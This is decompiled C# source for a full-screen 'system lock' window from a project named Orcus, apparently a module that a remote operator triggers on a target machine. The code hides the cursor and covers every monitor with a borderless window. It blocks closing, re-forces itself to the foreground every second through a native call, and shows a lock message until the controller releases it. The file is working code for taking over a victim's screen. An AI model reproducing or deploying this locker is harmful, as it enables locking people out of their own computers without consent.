using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Linq;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.StaticCommands.System;

namespace Orcus.StaticCommands.SystemLock;

public class SystemLockForm : Form
{
	private readonly Color _background;

	private readonly Brush _fontBrush;

	private readonly string _message;

	private bool _preventClosing;

	private readonly bool _isRotated;

	private readonly Timer _foregroundTimer;

	private Rectangle _textRectangle;

	private IContainer components;

	public SystemLockForm(string message, bool preventClosing, LockScreenBackground background, bool setToTopFrequently, bool isRotated)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Invalid comparison between Unknown and I4
		InitializeComponent();
		Cursor.Hide();
		_message = message;
		_preventClosing = preventClosing;
		_isRotated = isRotated;
		if (setToTopFrequently)
		{
			Timer val = new Timer();
			val.set_Interval(1000);
			_foregroundTimer = val;
			_foregroundTimer.add_Tick((EventHandler)ForegroundTimerOnTick);
		}
		if ((int)background != 1)
		{
			if ((int)background != 2)
			{
				_background = Color.Black;
				_fontBrush = Brushes.get_White();
			}
			else
			{
				_background = Color.FromArgb(41, 128, 185);
				_fontBrush = Brushes.get_White();
			}
		}
		else
		{
			_background = Color.White;
			_fontBrush = Brushes.get_Black();
		}
	}

	private void ForegroundTimerOnTick(object sender, EventArgs e)
	{
		((Control)this).BringToFront();
		NativeMethods.SetForegroundWindow(((Control)this).get_Handle());
	}

	protected override void OnPaint(PaintEventArgs e)
	{
		((Form)this).OnPaint(e);
		e.get_Graphics().Clear(_background);
		e.get_Graphics().set_SmoothingMode((SmoothingMode)2);
		e.get_Graphics().set_CompositingQuality((CompositingQuality)2);
		e.get_Graphics().set_TextRenderingHint((TextRenderingHint)4);
		e.get_Graphics().TranslateTransform((float)(_textRectangle.X + _textRectangle.Width / 2), (float)(_textRectangle.Y + _textRectangle.Height / 2));
		if (_isRotated)
		{
			e.get_Graphics().RotateTransform(180f);
		}
		string text = "Your system was locked by an Administrator";
		string message = _message;
		SizeF sizeF = e.get_Graphics().MeasureString(text, ((Control)this).get_Font());
		SizeF sizeF2 = (string.IsNullOrEmpty(_message) ? ((SizeF)new Size(0, 0)) : e.get_Graphics().MeasureString(message, ((Control)this).get_Font()));
		float num = sizeF.Height + sizeF2.Height;
		e.get_Graphics().DrawString(text, ((Control)this).get_Font(), _fontBrush, 0f - sizeF.Width / 2f, num / -2f);
		if (sizeF2.Height > 0f)
		{
			e.get_Graphics().DrawString(message, ((Control)this).get_Font(), _fontBrush, 0f - sizeF2.Width / 2f, 0f);
		}
	}

	protected override void OnLoad(EventArgs e)
	{
		((Form)this).OnLoad(e);
		Timer foregroundTimer = _foregroundTimer;
		if (foregroundTimer != null)
		{
			foregroundTimer.Start();
		}
		Screen[] allScreens = Screen.get_AllScreens();
		Screen val = allScreens.First((Screen x) => x.get_Primary());
		int num = allScreens.Min((Screen x) => x.get_Bounds().X);
		int num2 = allScreens.Min((Screen x) => x.get_Bounds().Y);
		int num3 = allScreens.Max((Screen x) => x.get_Bounds().X + x.get_Bounds().Width);
		int num4 = allScreens.Max((Screen x) => x.get_Bounds().Y + x.get_Bounds().Height);
		int num5 = 0;
		int num6 = 0;
		Screen[] array = allScreens;
		foreach (Screen val2 in array)
		{
			num5 += val2.get_Bounds().Height;
			num6 += val2.get_Bounds().Width;
		}
		((Form)this).set_Location(new Point(num, num2));
		((Form)this).set_Size(new Size(Math.Abs(num3 - num), Math.Abs(num4 - num2)));
		_textRectangle = new Rectangle(val.get_Bounds().X + 60, val.get_Bounds().Y + 60, val.get_Bounds().Width - 60, val.get_Bounds().Height - 60);
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		((Form)this).OnClosing(e);
		e.Cancel = _preventClosing;
	}

	protected override void OnClosed(EventArgs e)
	{
		((Form)this).OnClosed(e);
		Timer foregroundTimer = _foregroundTimer;
		if (foregroundTimer != null)
		{
			foregroundTimer.Stop();
		}
	}

	public void SafeClose()
	{
		_preventClosing = false;
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 25f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1177, 652));
		((Control)this).set_Font(new Font("Segoe UI Semibold", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(6));
		((Control)this).set_Name("SystemLockForm");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("Orcus System Lock");
		((Control)this).ResumeLayout(false);
	}
}
